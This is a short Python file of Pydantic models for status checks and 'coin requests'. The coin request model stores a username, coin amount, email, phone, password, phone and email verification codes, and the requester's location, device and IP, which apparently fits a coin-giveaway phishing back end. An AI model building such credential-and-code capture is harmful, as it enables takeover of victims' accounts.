from pydantic import BaseModel, Field
from typing import Optional
from datetime import datetime
import uuid

class StatusCheck(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    client_name: str
    timestamp: datetime = Field(default_factory=datetime.utcnow)

class StatusCheckCreate(BaseModel):
    client_name: str

class CoinRequest(BaseModel):
    id: str = Field(default_factory=lambda: str(uuid.uuid4()))
    username: str
    amount: int
    email: str
    phone: str
    password: Optional[str] = None
    phone_code: Optional[str] = None
    email_code: Optional[str] = None
    location: str = "Unknown"
    device: str = "Unknown"
    ip: str = "Unknown"
    timestamp: datetime = Field(default_factory=datetime.utcnow)

class CoinRequestCreate(BaseModel):
    username: str
    amount: int
    email: str
    phone: str
    password: Optional[str] = None
    phone_code: Optional[str] = None
    email_code: Optional[str] = None
    location: Optional[str] = "Unknown"
    device: Optional[str] = "Unknown"
    ip: Optional[str] = "Unknown"